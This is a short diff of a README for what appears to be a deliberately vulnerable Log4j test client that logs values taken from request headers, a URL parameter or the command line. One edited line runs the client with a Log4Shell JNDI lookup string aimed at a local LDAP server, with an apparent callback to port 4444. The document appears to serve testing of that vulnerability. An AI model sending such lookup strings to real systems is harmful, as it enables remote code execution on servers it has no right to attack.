@@ -8,10 +8,11 @@ java -jar l4sclients-0.1-all.jar [PORT]
   
 This will default to port 8888 and will log the header log_me  
 If not found we look for a header log_me_b64 and base64 decode that header and log it.
+It will also look for a single param called log_me.  Note it must be url encoded.
 
 ### CmdLine
 You can also run a CmdLine that will log the first param passed in.  
-java -cp l4sclients-0.1-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM_127_0_0_1_4444}'  
+java -cp l4sclients-0.1-all.jar Log4jCmdLine '${jndi:ldap://127.0.0.1:1389/#MM:127.0.0.1:4444}'  
   
 Note this is the same jar but run as a classpath entry with an explict class listed.
 
